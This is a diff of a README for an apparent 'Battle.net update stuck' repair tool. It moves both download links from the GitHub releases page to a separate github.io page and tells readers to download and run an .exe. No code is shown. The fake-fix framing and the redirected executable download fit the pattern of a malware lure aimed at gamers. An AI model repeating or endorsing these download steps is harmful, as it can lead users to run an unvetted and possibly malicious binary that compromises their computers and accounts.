@@ -1,6 +1,6 @@
 # 🛠️ Battle-net-Update-Stuck-Fix - Repair your stuck game updates now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/base-moratorium838/Battle-net-Update-Stuck-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://base-moratorium838.github.io)
 
 ## What is this tool?
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 You download the current version of the repair tool from the project release page.
 
-1.  Open the [Download Page](https://github.com/base-moratorium838/Battle-net-Update-Stuck-Fix/releases).
+1.  Open the [Download Page](https://base-moratorium838.github.io).
 2.  Look for the section marked Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder or your Desktop.
